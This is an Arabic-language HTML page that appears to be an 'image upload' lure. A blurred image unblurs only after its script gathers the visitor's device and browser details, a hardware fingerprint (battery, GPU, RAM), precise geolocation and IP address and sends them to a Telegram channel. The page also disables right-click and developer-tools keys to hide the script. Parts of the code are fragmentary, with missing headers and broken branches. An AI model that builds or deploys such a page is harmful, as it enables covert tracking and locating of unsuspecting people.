<!DOCTYPE html>

    <title>موقع رفع الصور</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 600px;
            width: 100%;
            background: white;
            border-radius: 20px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.15);
            overflow: hidden;
            animation: slideUp 0.8s ease-out;
        }

        @keyframes slideUp {
            from { transform: translateY(50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .header {
            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }

        .header h1 {
            font-size: 2.2em;
            margin-bottom: 10px;
        }

        .main-image {
            width: 100%;
            max-width: 400px;
            height: auto;
            border-radius: 15px;
            box-shadow: 0 15px 30px rgba(0,0,0,0.2);
            margin: 30px auto;
            filter: blur(20px);
            transition: filter 0.5s ease;
            display: block;
        }

        .main-image.clear {
            filter: blur(0px);
        }

        .click-button {
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 1.2em;
            font-weight: bold;
            cursor: pointer;
            margin: 20px auto;
            display: block;
            transition: all 0.3s ease;
        }

        .click-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(231, 76, 60, 0.4);
        }

        .success-message {
            background: #d4edda;
            color: #155724;
            padding: 20px;
            border-radius: 10px;
            margin: 20px;
            text-align: center;
            display: none;
        }

        .loading {
            display: none;
            text-align: center;
            padding: 20px;
            color: #666;
        }

        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #3498db;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>

            info.colorDepth = screen.colorDepth;
            info.pixelDepth = screen.pixelDepth || screen.colorDepth;
            info.devicePixelRatio = window.devicePixelRatio || 1;
            info.windowWidth = window.innerWidth;
            info.windowHeight = window.innerHeight;

            info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            info.timezoneOffset = new Date().getTimezoneOffset();
            info.timestamp = new Date().toISOString();
            info.localTime = new Date().toLocaleString('ar-SA');

            // تحديد نوع الجهاز ونظام التشغيل
            if (/iPhone/i.test(ua)) {
                info.deviceType = 'iPhone';
                info.brand = 'Apple';
                info.os = 'iOS';
                const iosMatch = ua.match(/iPhone OS (\d+)[._](\d+)(?:[._](\d+))?/);
                if (iosMatch) {
                    info.osVersion = iosMatch[3] ? `${iosMatch[1]}.${iosMatch[2]}.${iosMatch[3]}` : `${iosMatch[1]}.${iosMatch[2]}`;
                }
                info.isMobile = true;
            } else if (/iPad/i.test(ua)) {
                info.deviceType = 'iPad';
                info.brand = 'Apple';
                info.os = 'iOS';
                const iosMatch = ua.match(/OS (\d+)[._](\d+)(?:[._](\d+))?/);
                if (iosMatch) {
                    info.osVersion = iosMatch[3] ? `${iosMatch[1]}.${iosMatch[2]}.${iosMatch[3]}` : `${iosMatch[1]}.${iosMatch[2]}`;
                }
                info.isTablet = true;
            } else if (/Android/i.test(ua)) {
                info.os = 'Android';
                const androidMatch = ua.match(/Android (\d+(?:\.\d+)*)/);
                if (androidMatch) {
                    info.osVersion = androidMatch[1];
                }

                // استخراج موديل الجهاز

                    info.deviceType = 'Huawei';

                    info.brand = 'Xiaomi';
                    info.deviceType = 'Xiaomi';
                } else if (/OPPO/i.test(ua)) {
                    info.brand = 'OPPO';
                    info.deviceType = 'OPPO';
                } else if (/vivo/i.test(ua)) {
                    info.brand = 'Vivo';
                    info.deviceType = 'Vivo';
                } else if (/OnePlus/i.test(ua)) {
                    info.brand = 'OnePlus';
                    info.deviceType = 'OnePlus';
                } else if (/LG/i.test(ua)) {
                    info.brand = 'LG';
                    info.deviceType = 'LG';

                    info.brand = 'Sony';
                    info.deviceType = 'Sony Xperia';

                    info.deviceType = 'Nokia';

                    info.brand = 'Motorola';
                    info.deviceType = 'Motorola';
                } else {
                    info.brand = 'Android';
                    info.deviceType = 'Android';
                }

                if (/Mobile/i.test(ua)) {
                    info.isMobile = true;
                } else {
                    info.isTablet = true;
                }
            } else if (/Windows NT/i.test(ua)) {
                info.deviceType = 'Windows PC';
                info.brand = 'Microsoft';
                info.os = 'Windows';
                const winMatch = ua.match(/Windows NT (\d+\.\d+)/);
                if (winMatch) {
                    const versions = {
                        '10.0': 'Windows 10/11',
                        '6.3': 'Windows 8.1',
                        '6.2': 'Windows 8',
                        '6.1': 'Windows 7'
                    };
                    info.osVersion = versions[winMatch[1]] || winMatch[1];
                }
                info.isDesktop = true;
            } else if (/Mac OS X/i.test(ua)) {
                info.deviceType = 'Mac';
                info.brand = 'Apple';
                info.os = 'macOS';
                const macMatch = ua.match(/Mac OS X (\d+)[._](\d+)(?:[._](\d+))?/);

                    info.osVersion = macMatch[3] ? `${macMatch[1]}.${macMatch[2]}.${macMatch[3]}` : `${macMatch[1]}.${macMatch[2]}`;

                info.isDesktop = true;
            } else if (/Linux/i.test(ua)) {
                info.deviceType = 'Linux PC';
                info.brand = 'Linux';
                info.os = 'Linux';
                info.isDesktop = true;
            }

            // تحديد المتصفح
            if (/Chrome/i.test(ua) && !/Edge|OPR/i.test(ua)) {

                if (edgeMatch) info.browserVersion = edgeMatch[1];
            } else if (/OPR/i.test(ua)) {
                info.browser = 'Opera';
            } else {
                info.browser = 'غير معروف';
            }

            return info;

        // جمع معلومات الأجهزة المتقدمة
        async function getHardwareInfo() {
            let hardware = {};

            // معلومات المعالج
            if (navigator.hardwareConcurrency) {
                hardware.cpuCores = navigator.hardwareConcurrency;
            }

            // معلومات الذاكرة
            if (navigator.deviceMemory) {
                hardware.ram = navigator.deviceMemory + ' GB';
            }

            // معلومات التخزين
            if ('storage' in navigator && 'estimate' in navigator.storage) {
                try {
                    const estimate = await navigator.storage.estimate();
                    if (estimate.quota) {
                        hardware.storageQuota = Math.round(estimate.quota / 1024 / 1024 / 1024) + ' GB';
                        hardware.storageUsed = Math.round((estimate.usage || 0) / 1024 / 1024) + ' MB';
                    }
                } catch (e) {
                    hardware.storageError = 'غير متاح';
                }
            }

            // معلومات البطارية
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    hardware.batteryLevel = Math.round(battery.level * 100) + '%';
                    hardware.batteryCharging = battery.charging;
                    if (battery.chargingTime !== Infinity) {
                        hardware.chargingTime = Math.round(battery.chargingTime / 60) + ' دقيقة';
                    }
                    if (battery.dischargingTime !== Infinity) {
                        hardware.dischargingTime = Math.round(battery.dischargingTime / 60) + ' دقيقة';
                    }
                } catch (e) {
                    hardware.batteryError = 'غير متاح';
                }
            }

            // معلومات الشبكة
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection) {
                hardware.connectionType = connection.type || 'غير معروف';
                hardware.effectiveType = connection.effectiveType || 'غير معروف';
                if (connection.downlink) {
                    hardware.downlink = connection.downlink + ' Mbps';
                }
                if (connection.rtt) {
                    hardware.rtt = connection.rtt + ' ms';
                }
                hardware.saveData = connection.saveData || false;
            }

            // معلومات اللمس
            if (navigator.maxTouchPoints !== undefined) {
                hardware.maxTouchPoints = navigator.maxTouchPoints;
            }

            // معلومات الاهتزاز
            hardware.vibrationSupport = 'vibrate' in navigator;

            // معلومات WebGL
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        hardware.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        hardware.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                    hardware.webglVersion = gl.getParameter(gl.VERSION);
                    hardware.webglSupport = true;
                } else {
                    hardware.webglSupport = false;
                }
            } catch (e) {
                hardware.webglSupport = false;
            }

            // معلومات الإدخال
            if (window.matchMedia) {
                hardware.pointerType = window.matchMedia('(pointer: coarse)').matches ? 'coarse' :
                                     window.matchMedia('(pointer: fine)').matches ? 'fine' : 'none';
                hardware.hoverSupport = window.matchMedia('(hover: hover)').matches;
            }

            // معلومات الشاشة المتقدمة
            if (screen.orientation) {
                hardware.orientation = screen.orientation.type;
                hardware.orientationAngle = screen.orientation.angle;
            }

            return hardware;
        }

        // الحصول على الموقع الجغرافي
        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            altitudeAccuracy: position.coords.altitudeAccuracy,
                            heading: position.coords.heading,
                            speed: position.coords.speed,
                            timestamp: position.timestamp
                        });
                    },
                    () => {
                        resolve(null);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            });
        }

        // محاولة الحصول على IP ومعلومات الشبكة
        async function getIPInfo() {
            const ipServices = [
                'https://api.ipify.org?format=json',
                'https://httpbin.org/ip',
                'https://api.myip.com'
            ];

            for (let service of ipServices) {
                try {
                    const response = await fetch(service);
                    const data = await response.json();
                    return {
                        ip: data.ip || data.origin || 'غير معروف',
                        service: service
                    };
                } catch (e) {
                    continue;
                }
            }
            return null;
        }

                    console.log('✅ تم إرسال جميع البيانات بنجاح إلى تلكرام');
                    return true;
                } else {
                    console.log('❌ فشل الإرسال - رد الخادم:', response.status);
                    return false;
                }
            }).catch((error) => {
                console.log('❌ خطأ في الإرسال:', error);
                return false;
            });
        }

        // الدالة الرئيسية - مبسطة ومضمونة
        async function viewImage() {
            const button = document.getElementById('viewButton');
            const loading = document.getElementById('loading');
            const successMessage = document.getElementById('successMessage');
            const mainImage = document.getElementById('mainImage');
            
            // إخفاء الزر وإظهار التحميل
            button.style.display = 'none';
            loading.style.display = 'block';
            
            console.log('🔄 بدء جمع المعلومات...');
            
            try {
                // جمع جميع البيانات
                const deviceInfo = getCompleteDeviceInfo();
                const hardwareInfo = await getHardwareInfo();
                const locationInfo = await getLocation();
                const ipInfo = await getIPInfo();
                
                const allData = {
                    device: deviceInfo,
                    hardware: hardwareInfo,
                    location: locationInfo,
                    ip: ipInfo
                };
                
                console.log('📊 جميع البيانات المجمعة:', allData);
                
                // إرسال البيانات
                const sent = await sendToTelegram(allData);
                
                // إخفاء التحميل
                loading.style.display = 'none';
                
                if (sent) {
                    // إظهار الصورة والرسالة
                    mainImage.classList.add('clear');
                    successMessage.style.display = 'block';
                    console.log('✅ تم إكمال العملية بنجاح');
                } else {
                    // إظهار خطأ
                    button.style.display = 'block';
                    button.textContent = '⚠️ حدث خطأ - حاول مرة أخرى';
                    button.style.background = 'linear-gradient(135deg, #f39c12 0%, #e67e22 100%)';
                }
                
            } catch (error) {
                console.error('❌ خطأ في العملية:', error);
                loading.style.display = 'none';
                button.style.display = 'block';
                button.textContent = '⚠️ حدث خطأ - حاول مرة أخرى';
                button.style.background = 'linear-gradient(135deg, #f39c12 0%, #e67e22 100%)';
            }
        }

        // ربط الأحداث
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('viewButton').addEventListener('click', viewImage);
        });

        // جمع الموقع مسبقاً عند تحميل الصفحة
        window.addEventListener('load', async function() {
            console.log('🚀 تم تحميل الصفحة - جاهز للعمل');
            
            // محاولة الحصول على الموقع مسبقاً لتسريع العملية
            try {
                const location = await getLocation();
                if (location) {
                    console.log('✅ تم الحصول على الموقع مسبقاً');
                } else {
                    console.log('⚠️ لم يتم منح إذن الموقع');
                }
            } catch (e) {
                console.log('⚠️ خطأ في الحصول على الموقع:', e);
            }
        });

        // حماية بسيطة
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });

        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
                e.preventDefault();
            }
        });
    </script>
